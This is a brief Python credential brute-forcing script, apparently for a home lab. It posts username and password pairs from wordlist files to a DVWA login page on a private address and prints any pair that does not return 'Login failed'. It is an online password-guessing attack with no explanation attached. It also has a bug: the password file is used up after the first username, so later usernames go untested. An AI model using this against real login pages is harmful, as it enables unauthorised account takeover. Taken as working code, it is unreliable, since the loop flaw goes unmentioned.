import requests

target_url = 'http://192.168.50.101/dvwa/login.php'
usernames_file = '/home/kali/Desktop/brute/usernames.txt'
passwords_file = '/home/kali/Desktop/brute/passwords.txt'

with open(usernames_file, 'r') as usernames:
    with open(passwords_file, 'r') as passwords:
        for username in usernames:
            username = username.strip()
            
            for password in passwords:
                password = password.strip()
                
                response = requests.post(target_url, data={'username': username, 'password': password})
                
                print('Provo con: {}/{}'.format(username, password))
                print('Stato della risposta: {}'.format(response.status_code))
                
                if response.status_code == 200:
                    if 'Login failed' not in response.text:
                        print('Combinazione utente/password trovata: {}/{}'.format(username, password))
                        break
                    else:
                        print('Combinazione errata.')

